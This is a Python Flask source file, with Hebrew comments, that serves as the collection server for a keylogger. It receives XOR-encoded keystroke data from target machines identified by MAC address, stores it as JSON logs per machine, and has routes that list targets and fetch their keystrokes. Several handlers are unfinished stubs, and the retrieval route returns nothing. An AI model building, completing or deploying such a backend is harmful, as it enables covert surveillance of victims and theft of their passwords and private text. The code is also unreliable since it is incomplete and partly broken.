from flask import Flask,jsonify,request
from encryptor import Encryptor
import json
import os
import time
import logging

class App:

    def __init__(self):
        self.path = "data\\"
        self.counter = 0
        self.manager = {}

    def add_computer(self,computer_name):
        self.manager[f"computer {self.counter}"] = computer_name
        self.counter += 1

    def get_data(self,computer_name):
        pass
        #בדיקה האם הכניס שם מחשב

        #בדיקה האם המחשב נמצא במערכת

        #קבלת רשימה של כל הקבצים

    def get_computer_list(self):
        computer_list = []
        for computer in self.manager:
            computer_list.append(computer)
        return computer_list

app = Flask(__name__)

@app.route('/')
def home():
    pass

@app.route("/api/upload",methods=['POST'])
def upload():

    data = request.get_json()

    # ניהול שגיאות
    if error_manager(data):
        return jsonify({"error": "error", "message": data})

    # process = SpecialKeys()
    decryptor = Encryptor()

    #להחזיר את ההצפנה למתונים המקוריים
    print(data)
    data = decryptor.xor(data)
    print(data)

    #קבלת הנתונים המתאימים
    folder_name = data["mac_name"].replace(":","_")
    new_data = data["data"]

    #הוספת הכתבות למחלקה
    manager.add_computer(folder_name)

    #יצירת תיקיה למחשב הנתון
    folder_path = "data\\" + folder_name
    open_new_folder(folder_path)

    #יצירת נתיב ליצירת קובץ
    file_path = folder_path + '\\' + generate_json_file()

    #שליחת הנתונים הרלוונטים לקובץ
    save_data_in_DB(data,file_path)
    return jsonify({"message" : "done", "data" : data})


def error_manager(data:dict) -> bool:
    if not data:
        return True
    return False


def open_new_folder(folder_name):
    if not os.path.exists(folder_name):
        os.mkdir(folder_name)

def generate_json_file():
    return "log_" + time.strftime("%Y-%m-%d_%H_%M_%S") + ".json"

def save_data_in_DB(data,file_path):
    with open(file_path,'w',encoding="utf-8") as file:
        json.dump(data,file,indent=4,ensure_ascii=False)
        logging.error(f"file {file_path} is opened")


@app.route("/api/get_machine_list",methods=["GET"])
def get_target_machine_list():
    return jsonify({"message" : manager.get_computer_list()})

@app.route("/get_keystrokes",methods=["GET"])
def get_data_from_DB():
    computer_name = request.args.get("computer")

    manager.get_data(computer_name)
    #בדיקה האם שלח פרמטר מחשב

    #בדיקה האם קיים כזה מחשב

    #שליחת המידע הרלוונטי


@app.route("/api/data",methods=['GET'])
def get_data():
    pass

if __name__ == '__main__':
    manager = App()
    app.run(debug=True,port=5000)

